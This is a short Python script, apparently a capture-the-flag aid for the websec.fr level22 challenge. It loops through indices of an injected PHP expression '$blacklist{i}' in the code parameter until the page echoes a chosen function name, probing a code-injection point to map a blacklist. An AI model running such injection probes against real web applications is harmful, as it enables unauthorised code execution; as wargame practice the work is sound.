import requests

URL = "https://websec.fr/level22/index.php?code="

i = 0

function_name = input('> ')
while True:
    r = requests.get(URL + "$blacklist{I}".replace('I', f'{i}'))
    print("Trying: " + f"{i}")
    if function_name in r.text:
        print(i)
        break
    if 'Undefined offset' in r.text:
        exit('Out of range')
    i+=1